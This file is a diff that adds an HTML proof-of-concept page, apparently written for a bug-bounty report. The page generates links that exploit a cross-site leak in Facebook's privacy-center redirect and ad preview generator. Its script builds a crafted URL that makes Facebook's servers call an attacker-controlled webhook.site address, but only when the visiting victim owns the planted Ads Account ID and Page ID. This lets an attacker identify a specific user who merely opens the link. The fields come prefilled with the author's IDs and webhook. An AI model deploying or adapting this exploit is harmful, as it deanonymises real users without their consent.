@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alert! Test Page</title>
+    <style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f9;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        overflow-y: auto; /* Allow the body to be scrollable */
+    }
+    .container {
+        background: #fff;
+        padding: 20px 40px;
+        border-radius: 10px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        max-width: 500px;
+        width: 90%;
+        max-height: 90%; /* Ensure it doesn't exceed the viewport */
+        overflow-y: auto; /* Makes content inside the container scrollable */
+    }
+    .title {
+        font-size: 24px;
+        font-weight: bold;
+        color: #d9534f;
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    .caution {
+        font-size: 14px;
+        color: #000000;
+        background-color: #fff3cd;
+        padding: 15px;
+        border: 1px solid #ffeeba;
+        border-radius: 5px;
+        margin-bottom: 20px;
+    }
+    .input-group {
+        display: flex;
+        flex-direction: column;
+        margin-bottom: 15px;
+    }
+    .input-group label {
+        font-size: 14px;
+        margin-bottom: 5px;
+        color: #333;
+    }
+    .input-group input {
+        padding: 8px;
+        font-size: 14px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+    }
+    .btn-container {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 15px;
+    }
+    .btn {
+        padding: 10px 20px;
+        font-size: 14px;
+        color: #fff;
+        background-color: #007bff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+    .btn:hover {
+        background-color: #0056b3;
+    }
+    .generated-link {
+        margin-top: 20px;
+        font-size: 14px;
+        word-break: break-word;
+        color: #333;
+    }
+    .generated-link a {
+        color: #007bff;
+        text-decoration: none;
+    }
+    .generated-link a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">Alert! Test Page</div>
+        <div class="caution">
+            <p><strong>Instructions for testing: POINT QUERY CURRENT USER IS CERTAIN Ads Account ID and Page ID. </strong></p>
+            <p><strong>
+                This user input is solely for testing purposes. As you will be testing with your test Ads Account ID and Page ID, which you have not provided, the Generate button will create the necessary link directly for your Ads Account ID and Page ID. However, to facilitate cross-site leak testing, we as a attacker can already place all the necessary information to determine whether the current user is indeed the correct Ads Account ID and Page ID, are you able to understand if not ask in the original report.
+            </strong></p>
+            <ol>
+                <li><strong>Enter your Ads Account ID</strong> and <strong>Page ID</strong> that you want to test with(Eg. put one time incorrect and another time correct ids).</li>
+                <li>Enter a <strong>Unique Word</strong> of your choice (e.g., a random string,like: incorrect,correct or simply put uid).</li>
+                <li>Provide your <strong>Webhook URL</strong> where the trigger will be sent if the Ads Account ID and Page ID matched to current logged in victim.</li>
+                <li>Click the <strong>Generate</strong> button to create the test link.</li>
+                <li>Visit the generated link while logged in as the victim with the specified Ads Account ID and Page ID.</li>
+                <li>
+                   If you didn't change the webhook link I have kept below. Once triggered, I will reply with the <strong>Unique Word</strong> you entered while logged in as the victim having the Ads Account ID and Page ID to point query if the current user is a certain Ads Account ID and Page ID (cross-site leak). But for testing, do anyway you like.
+                </li>
+                <li>
+                    Remember in this modified POC, webhook <strong>takes some minutes</strong> to reflect trigger since it first passes through mine website's redirector. The fact is trigger to webhook will be received only when point query matches the current user, otherwise not.  
+                    So check after <strong>10 minutes</strong>; webhook trigger will be there with the unique word you put while you test logged in as correct victim. And there will not be webhook trigger with the unique word while you tested logged in as an incorrect victim. By this way, trigger will be less and only when logged in as correct victim. Thus smooth POINT QUERY if current user has certain Ads Account ID and Page ID or not.
+                </li>
+                <li>Victim <strong>just need to go to the link and doesn't need to do or click anything, As a victim you can close that tab just some seconds after opening, No any further action needed.</strong> The facebook server's are triggering not from cilent side, so victim just need to go to the link once, no further action from victim.The <strong>10 minutes</strong> wait time is for attacker webhook trigger by server side.</li>
+                <li>In this POC i modified such that webhook will be triggered only if <strong>Ads Account ID and Page ID matched to current logged in victim.</strong>By using my own website at intermediate before webhook.And webhook will be triggered only when <strong>CORRECT VICTIM goes to link WITH their Ads Account ID and Page ID which attacker planted.</strong>Thus easy cross site point query.</li>
+                <li><strong>Generate Link</strong> button is Below.Clicking will show link for required ids. Which you can <strong>Copy and Test or Click Go To Link</strong> for testing.</li>
+            </ol>
+        </div>
+        <form id="linkForm">
+            <div class="input-group">
+                <label for="adsAccountId">Ads Account ID. I have set a value that I control, but you can change it.</label>
+                <input type="text" id="adsAccountId" placeholder="Enter Ads Account ID" value="289771427800034" required>
+            </div>
+            <div class="input-group">
+                <label for="pageId">Page ID. I have set a value that I control, but you can change it.</label>
+                <input type="text" id="pageId" placeholder="Enter Page ID" value="100054398251546" required>
+            </div>
+            <div class="input-group">
+                <label for="uniqueWord">Your Unique Word for Each time. I have set a value that I control, but you can change it. OR type uid</label>
+                <input type="text" id="uniqueWord" placeholder="Enter Your Unique Word" value="100003015376653" required>
+            </div>
+            <div class="input-group">
+                <label for="webhookUrl">Webhook URL. I have set a value that I control, but you can change it.</label>
+                <input type="url" id="webhookUrl" placeholder="Enter Webhook URL"
+                    value="webhook.site/f0f94b63-bf5d-4a97-b756-f8b4c3aa0755" 
+                    required
+                    oninput="this.value = this.value.replace(/^https?:\/\//, '')">
+            </div>
+            <div class="btn-container">
+                <button type="button" class="btn" id="generateBtn">Generate</button>
+                <button type="button" class="btn" id="goToBtn" style="display: none;">Go to Link</button>
+            </div>
+        </form>
+        <div class="generated-link" id="generatedLink"></div>
+    </div>
+
+    <script>
+        document.getElementById('generateBtn').addEventListener('click', function() {
+            const adsAccountId = document.getElementById('adsAccountId').value;
+            const pageId = document.getElementById('pageId').value;
+            const uniqueWord = document.getElementById('uniqueWord').value;
+            const webhookUrl = document.getElementById('webhookUrl').value;
+
+            if (adsAccountId && pageId && uniqueWord && webhookUrl) {
+                const generatedUrl = `https://www.facebook.com/privacy/center/l/?logging_data%5B0%5D&redirect_url=https%3A%2F%2Fwww.facebook.com%2Fads%2Fad_preview_generator_iframe%2F%3Fad_account_id%3D${encodeURIComponent(adsAccountId)}%26ad_preview_format%3DMESSENGER_MOBILE_INBOX_MEDIA%26app_id%3D1146105192114219%26creative_spec%3D%257B%2522degrees_of_freedom_spec%2522%253A%257B%2522degrees_of_freedom_type%2522%253A%2522USER_ENROLLED_LWI_ACO%2522%257D%252C%2522instagram_branded_content%2522%253A%257B%257D%252C%2522object_story_spec%2522%253A%257B%2522instagram_actor_id%2522%253A%25222017589668282247%2522%252C%2522link_data%2522%253A%257B%2522call_to_action%2522%253A%257B%2522type%2522%253A%2522APPLY_NOW%2522%252C%2522value%2522%253A%257B%2522link%2522%253A%2522https%253A%252F%252F${encodeURIComponent(webhookUrl)}%2F${encodeURIComponent(uniqueWord)}%252F%2522%257D%257D%252C%2522link%2522%253A%2522https%253A%252F%252F${encodeURIComponent(webhookUrl)}%2F${encodeURIComponent(uniqueWord)}%252F%2522%252C%2522message%2522%253A%2522%7BYOUR%2520PAYLOAD%7D%2522%252C%2522name%2522%253A%2522%7BYOUR%2520PAYLOAD%7D%2522%252C%2522picture%2522%253A%2522https%253A%252F%252Fdrwhitehack.github.io%2Fimage%2FIMG_1499.jpeg%2522%252C%2522use_flexible_image_aspect_ratio%2522%253Atrue%252C%2522phone_data_id%2522%253Anull%257D%252C%2522page_id%2522%253A%2522${encodeURIComponent(pageId)}%2522%257D%252C%2522use_page_actor_override%2522%253Anull%257D`;
+                const linkContainer = document.getElementById('generatedLink');
+                linkContainer.innerHTML = `Generated Link: <a href="${generatedUrl}" target="_blank">${generatedUrl}</a>`;
+                document.getElementById('goToBtn').style.display = 'inline-block';
+                document.getElementById('goToBtn').onclick = () => {
+                    window.location.href = generatedUrl;
+                };
+            } else {
+                alert('Please fill in all fields.');
+            }
+        });
+    </script>
+</body>
+</html>
